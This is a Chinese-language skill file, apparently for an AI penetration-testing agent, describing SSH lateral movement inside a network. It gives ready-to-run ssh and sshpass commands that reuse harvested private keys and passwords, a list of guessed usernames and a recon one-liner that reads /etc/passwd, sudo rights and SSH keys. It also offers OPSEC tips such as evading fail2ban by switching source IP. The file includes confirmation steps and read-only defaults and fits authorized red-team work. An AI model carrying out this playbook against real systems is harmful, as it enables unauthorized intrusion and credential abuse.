---
name: lateral-move-ssh
description: 利用已收集的 SSH 私钥或密码凭据，尝试横向移动到内网其他主机。当发现 SSH 私钥、SSH 密码或内网存活主机开放 22 端口时使用。
enabled: true
---

# SSH 横向移动

当已收集到 SSH 凭据（私钥或密码）且内网存在开放 22 端口的主机时，使用本 skill 尝试横向移动建立新立足点。

> 前置条件：需已完成 `hunt-credentials`（获取 SSH 凭据）和 `recon-internal-network`（识别 22 端口存活主机）。

---

## 一、OPSEC 与约束

| 原则 | 说明 |
|---|---|
| 最小尝试 | 每个目标最多尝试 3 组凭据，避免触发 fail2ban 或告警 |
| 静默优先 | 不使用 SSH 交互模式，使用 `-o BatchMode=yes` 避免密码交互阻塞 |
| 不修改 | 不修改目标 authorized_keys、不植入持久化，仅验证可达性和执行只读侦察 |
| 不扩散 | 不在新主机上继续自动横向，每跳需用户确认 |
| 日志意识 | SSH 登录会写入目标 auth.log/secure，提醒用户注意痕迹 |

**确认机制：**
- 首次 SSH 连接尝试需要用户确认（高影响操作）
- 连接成功后执行的命令默认只读（whoami、id、hostname、ifconfig）
- 任何写入操作需要再次确认

---

## 二、目标

- 验证已获取的 SSH 凭据在哪些内网主机上有效
- 确认登录后的权限级别（root / 普通用户 / 受限 shell）
- 收集新立足点的基础信息（OS、网络接口、用户身份）
- 评估新立足点的横向移动价值（是否有新网段、新凭据、更高权限）

---

## 三、Skill 元数据

- riskLevel: `high`
- accessMode: `active_exploit`
- requiredTools: `CommandTools`, `FileTools`
- optionalTools: `ScanTools`, `CredentialHarvestTools`
- produces: `lateralMovement.sshAccess[]`, `lateralMovement.newFootholds[]`, `openQuestions`
- structuredPatchPaths: `lateralMovement.sshAccess[]`, `lateralMovement.newFootholds[]`
- recommendedNextSkills: `recon-basic-info` (在新立足点), `hunt-credentials` (在新立足点), `escalate-linux-privilege` (如果非 root)
- forbiddenByDefault: 修改 authorized_keys、植入后门、在新主机继续自动横向、删除日志

---

## 四、工作流程

### 执行前：制定计划

在任何工具调用前，先输出：

1. **目标**：利用已收集的 SSH 凭据尝试横向移动到内网主机，验证凭据有效性并收集新立足点信息。
2. **路径**：整理凭据-目标匹配矩阵 → 按优先级尝试连接 → 成功后执行只读侦察 → 评估价值。
3. **终止条件**：至少成功建立一个新立足点，或所有高优先级目标均已尝试且失败时停止。

必须先读取侦察摘要，提取：
- `credentials.sshKeys` — SSH 私钥路径和内容
- `credentials.generic` — 可能包含 SSH 密码的条目
- `networkProfile.liveHosts` — 存活主机列表
- `serviceProfile.openPorts` — 开放 22 端口的主机

### 第一阶段：构建凭据-目标匹配矩阵

从侦察摘要中提取并组合：

**凭据来源：**

| 类型 | 来源 | 使用方式 |
|---|---|---|
| SSH 私钥 | `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` 等 | `-i <keyfile>` |
| 明文密码 | 环境变量、配置文件、进程参数 | `sshpass -p` 或记录待手动输入 |
| known_hosts | `~/.ssh/known_hosts` | 提取历史连接目标 |
| SSH config | `~/.ssh/config` | 提取别名、用户名、端口映射 |

**目标排序优先级：**

| 优先级 | 条件 | 理由 |
|---|---|---|
| P0 | known_hosts 中存在 + 22 端口开放 | 历史连接过，凭据极可能有效 |
| P1 | SSH config 中配置的主机 | 管理员预设，凭据匹配率高 |
| P2 | 同网段 + 22 端口开放 | 内网同段常共享凭据 |
| P3 | 跨网段 + 22 端口开放 | 可能是跳板机或管理网 |

**用户名猜测顺序：**
1. SSH config 中指定的用户名
2. 当前主机的用户名（`whoami`）
3. 私钥文件所在目录的属主
4. 常见用户名：`root`、`admin`、`deploy`、`app`、`ops`

### 第二阶段：准备与验证

在尝试连接前，先做环境检查：

```bash
# 确认 ssh 客户端可用
which ssh

# 确认私钥文件权限（权限过宽会被拒绝）
ls -la ~/.ssh/id_*

# 如果私钥权限不对，需修复（需确认）
# chmod 600 <keyfile>

# 检查 known_hosts 中的历史目标
cat ~/.ssh/known_hosts | awk '{print $1}' | sort -u

# 检查 SSH config
cat ~/.ssh/config
```

如果 `ssh` 不可用，尝试定位其他路径（`/usr/bin/ssh`、`/usr/local/bin/ssh`）；如果确实没有 SSH 客户端，skill 无法继续，报告终止。

### 第三阶段：连接尝试（需用户确认）

按优先级逐个尝试，每个目标最多 3 组凭据。

**私钥方式：**

```bash
# BatchMode 避免交互阻塞；StrictHostKeyChecking=no 避免首次连接确认阻塞
ssh -o BatchMode=yes \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 \
    -i <keyfile> \
    <user>@<target> \
    "echo SSH_OK && whoami && hostname && id"
```

**密码方式（需要 sshpass）：**

```bash
# 先确认 sshpass 可用
which sshpass

sshpass -p '<password>' ssh \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 \
    <user>@<target> \
    "echo SSH_OK && whoami && hostname && id"
```

**结果判断：**

| 输出 | 含义 | 下一步 |
|---|---|---|
| `SSH_OK` + 身份信息 | 登录成功 | 进入第四阶段 |
| `Permission denied` | 凭据无效 | 换下一组凭据或下一个目标 |
| `Connection refused` | 端口未开放或被防火墙拦截 | 跳过该目标 |
| `Connection timed out` | 网络不可达 | 跳过该目标 |
| `Host key verification failed` | 主机密钥变更 | `-o StrictHostKeyChecking=no` 已处理 |
| `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED` | 中间人风险 | 标注警告，由用户决定是否继续 |

### 第四阶段：新立足点快速侦察（只读）

连接成功后，在单次 SSH 命令中执行只读侦察（避免多次连接增加日志条目）：

```bash
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    -i <keyfile> <user>@<target> \
    "echo '=== IDENTITY ===' && whoami && id && hostname && \
     echo '=== OS ===' && (cat /etc/os-release 2>/dev/null || uname -a) && \
     echo '=== NETWORK ===' && (ip addr 2>/dev/null || ifconfig) && \
     echo '=== ROUTES ===' && (ip route 2>/dev/null || netstat -rn) && \
     echo '=== LISTENING ===' && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) && \
     echo '=== USERS ===' && (cat /etc/passwd | grep -v nologin | grep -v false) && \
     echo '=== SUDO ===' && (sudo -l 2>/dev/null || echo 'sudo not available') && \
     echo '=== SSH_KEYS ===' && (ls -la ~/.ssh/ 2>/dev/null || echo 'no .ssh dir') && \
     echo '=== DOCKER ===' && (docker ps 2>/dev/null || echo 'no docker')"
```

**评估维度：**

| 维度 | 高价值信号 |
|---|---|
| 权限 | root 或有 sudo NOPASSWD |
| 新网段 | 发现当前主机不可达的网段 |
| 凭据跳板 | .ssh 目录有更多私钥或 known_hosts |
| 服务 | 运行数据库、配置中心等高价值服务 |
| 容器 | Docker 环境可能逃逸 |

---

## 五、工具优先级

| 优先级 | 工具 | 用途 |
|---|---|---|
| 1 | `CommandTools.exec` | SSH 连接尝试（设置合理超时，避免阻塞） |
| 2 | `FileTools.readTextFile` | 读取 known_hosts、SSH config、私钥文件 |
| 3 | `CommandTools.exec` | 快速环境检查（which ssh、ls .ssh） |
| 4 | `ScanTools` | 补充确认目标 22 端口状态 |

**超时设置：**
- SSH 连接尝试使用 `exec`，timeout 建议 15-20 秒（含网络延迟 + 认证）
- 快速检查使用 `exec`

---

## 六、失败回退

| 场景 | 回退策略 |
|---|---|
| ssh 客户端不存在 | 检查 /usr/bin/ssh、/usr/local/bin/ssh；不可用则终止 |
| sshpass 不存在 | 跳过密码方式，仅使用私钥；提示用户密码目标需手动验证 |
| 私钥权限过宽 (0644) | 请求确认后 chmod 600（写操作需确认） |
| 所有凭据均失败 | 检查用户名是否匹配、端口是否非标准（从 SSH config 或 nmap 获取） |
| 目标使用非标端口 | 从扫描结果或 SSH config 获取实际端口，加 `-p <port>` |
| 连接被 fail2ban 封禁 | 停止对该目标的尝试，等待或换源 IP |
| SSH 版本不兼容 | 添加 `-o KexAlgorithms=+diffie-hellman-group1-sha1` 等兼容选项 |

---

## 七、输出格式

```markdown
## SSH 横向移动摘要

**尝试目标数**：{n}
**成功登录数**：{n}
**新立足点数**：{n}

---

## 凭据-目标匹配矩阵

| 目标 IP | 端口 | 用户名 | 凭据类型 | 凭据来源 | 结果 |
|---------|------|--------|---------|---------|------|
| 10.0.0.12 | 22 | root | 私钥 | ~/.ssh/id_rsa | 成功 |
| 10.0.0.15 | 22 | app | 密码 | env:SSH_PASS | 拒绝 |

## 成功立足点

### {IP} — {hostname}

- **登录用户**：{user}
- **权限级别**：{root / sudo / 普通用户}
- **操作系统**：{os_info}
- **新发现网段**：{new_cidrs or "无"}
- **监听服务**：{key_services}
- **二次横向潜力**：{high / medium / low}
- **理由**：{assessment}

## 失败记录

| 目标 | 失败原因 | 备注 |
|------|---------|------|
| 10.0.0.15 | Permission denied (3/3) | 所有凭据无效 |

## 风险提示

- 登录行为已写入目标主机 /var/log/auth.log（或 /var/log/secure）
- {other_opsec_notes}

## 下一步建议

根据成功的立足点情况给出 2~3 条建议：
- 新立足点发现更多网段 → "建议在新立足点执行 recon-internal-network 探测新网段"
- 新立足点有更多 SSH 私钥 → "建议在新立足点执行 hunt-credentials 继续凭据收集"
- 新立足点为普通用户 → "建议执行 escalate-linux-privilege 尝试提权"
- 新立足点运行数据库 → "建议执行 collect-jdbc-connection-info 收集本地数据库信息"
```

---

## 八、结构化摘要写入

完成后必须：

1. `manage_recon_summary(action="append")` — 记录成功/失败的目标、使用的凭据类型、新立足点关键信息
2. `manage_recon_summary(action="append")` — 合并机器可读字段

结构化 patch 示例：

```json
{
  "lateralMovement": {
    "sshAccess": [
      {
        "target": "10.0.0.12",
        "port": 22,
        "user": "root",
        "credentialType": "privateKey",
        "credentialSource": "/home/app/.ssh/id_rsa",
        "result": "success",
        "privilegeLevel": "root",
        "hostname": "db-server-01"
      },
      {
        "target": "10.0.0.15",
        "port": 22,
        "user": "app",
        "credentialType": "password",
        "credentialSource": "env:SSH_PASS",
        "result": "denied",
        "attempts": 3
      }
    ],
    "newFootholds": [
      {
        "target": "10.0.0.12",
        "hostname": "db-server-01",
        "os": "Ubuntu 20.04",
        "privilegeLevel": "root",
        "newCidrs": ["10.0.1.0/24"],
        "keyServices": ["mysql:3306", "redis:6379"],
        "lateralPotential": "high",
        "reason": "root 权限 + 发现新网段 + 本地数据库服务"
      }
    ]
  },
  "openQuestions": ["recon-basic-info (on 10.0.0.12)", "hunt-credentials (on 10.0.0.12)"]
}
```

---

## 九、决策规则

| 场景 | 行为 |
|---|---|
| 无 SSH 凭据 | 终止，建议先执行 hunt-credentials |
| 无 22 端口目标 | 终止，建议先执行 recon-internal-network |
| 首次连接尝试 | 必须用户确认（高影响操作） |
| 凭据连续失败 3 次 | 停止该目标，标注为凭据不匹配 |
| 成功登录 | 立即执行只读侦察，不要等待 |
| 发现 root 权限 | 标记为高价值，优先报告 |
| 新主机有更多私钥 | 记录但不自动使用，提示用户决定是否继续 |
| 目标出现异常响应 | 停止，可能是蜜罐，标注警告 |
| 连续多目标 Connection refused | 可能有网络策略拦截，停止并报告 |

---

## 十、OPSEC 痕迹提示

每次成功登录后，提醒用户以下痕迹已产生：

| 痕迹位置 | 内容 |
|---|---|
| 目标 `/var/log/auth.log` 或 `/var/log/secure` | 登录成功记录（IP、用户名、时间） |
| 目标 `lastlog` / `wtmp` | 登录历史 |
| 目标 `~/.bash_history` | 如果进入交互 shell |
| 源主机 `~/.ssh/known_hosts` | 新增目标主机指纹（已用 StrictHostKeyChecking=no 跳过） |
| 网络层 | SSH 流量特征（加密但可识别协议） |
